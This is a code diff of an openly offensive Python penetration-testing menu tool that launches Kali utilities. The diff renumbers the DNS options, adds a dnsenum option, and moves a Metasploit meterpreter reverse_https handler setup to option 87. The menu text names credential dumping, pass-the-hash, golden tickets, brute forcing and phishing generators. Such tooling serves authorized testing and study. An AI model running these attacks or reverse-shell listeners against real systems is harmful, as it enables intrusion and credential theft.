@@ -568,13 +568,13 @@ def options():
    print('\u2551' + "(01) Re/Set DNS  SERVER (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
    print('\u2551' + "(02) Re/Set REMOTE   IP (13) Start HTTPServer (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
    print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) Editor HASH (80) Hydra  WEB (91) SSHKeyID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) MSFCon Rev Shell (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) WhoIs DNS SERVER (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra POP3 (93) Netcat   " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig   DNS SERVER (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra SMTP (94) SQSH     " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) WhoIs DNS SERVER (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) Editor HOST (81) Hydra  SMB (92) Telnet   " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) Dig   DNS SERVER (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra POP3 (93) Netcat   " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) Enum  DNS SERVER (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra SMTP (94) SQSH     " + '\u2551')
    print('\u2551' + "(07) Re/Set NTLM   HASH (18) Recon DNS SERVER (29) PS  Exec (40) RpcClient Serv (51) HASHS Sprayer (62) SmbExecHASH (73) GenListPass (84) Hydra  TOM (95) MSSQL    " + '\u2551')
    print('\u2551' + "(08) Re/Set TICKET NAME (19) Dump  DNS SERVER (30) SMB Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) MSFCon TOM (96) MySQL    " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Live  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) MSFCon OWA (97) WinRm    " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87)            (98) RemDesk  " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87) MSFCon RCE (98) RemDesk  " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88)            (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
@@ -1247,32 +1247,6 @@ while True:
       command("xdotool type 'clear; cat " + dataDir + "/banner3.txt'; xdotool key Return")
       command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
       command("xdotool key Ctrl+Tab")
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Start metersploit shell server
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='15':
-      checkParams = getPort()
-      
-      if checkParams != 1:        
-         with open("meterpreter.rc", "w") as write:
-            write.write("use exploit/multi/handler\n")
-            write.write("set PAYLOAD /windows/x64/meterpreter/reverse_https\n")
-            write.write("set LHOST " + localIP + "\n")
-            write.write("set LPORT " + checkParams + "\n")
-            write.write("clear\n")
-            write.write("cat " + dataDir + "/banner4.txt\n")
-            write.write("run\n")
-            
-         command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
-         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-         command("xdotool key Ctrl+Tab")            
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1282,7 +1256,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '16':
+   if selection == '15':
       if DNS[:5] == "EMPTY":
          print("[-] DNS has not been specified...")
          checkParams = 1      
@@ -1300,15 +1274,31 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '17':
+   if selection == '16':
       if DNS[:5] == "EMPTY":
          print("[-] DNS has not been specified...")
          checkParams = 1
          
       if checkParams != 1:
-         print("[+] Checking DNS...\n")
-         command("dig authority " + DNS.rstrip(" "))
-      prompt()     
+         print("[+] Checking DNS Server...\n")
+         command("dig authority " + DNS.rstrip(" ") + " +noedns")
+      prompt()  
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='17':
+      checkParams = testTwo()
+
+      if checkParams != 1:
+         print("[+] Checking DOMAIN server...\n")
+         command("dnsenum " + DOM.rstrip(" "))
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1319,9 +1309,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '18':
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain has not been specified...")
-         checkParams = 1
+      checkParams = testTwo()
          
       if checkParams != 1:
          print("[+] Checking DOMAIN server...\n")
@@ -3325,17 +3313,32 @@ while True:
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER OWA'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
-            
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - Start metersploit shell server
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='87':
-      exit(1)
+      checkParams = getPort()
+      
+      if checkParams != 1:        
+         with open("meterpreter.rc", "w") as write:
+            write.write("use exploit/multi/handler\n")
+            write.write("set PAYLOAD /windows/x64/meterpreter/reverse_https\n")
+            write.write("set LHOST " + localIP + "\n")
+            write.write("set LPORT " + checkParams + "\n")
+            write.write("clear\n")
+            write.write("cat " + dataDir + "/banner4.txt\n")
+            write.write("run\n")
+            
+         command("xdotool key Ctrl+Shift+T")
+         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
+         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
+         command("xdotool key Ctrl+Tab")  
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
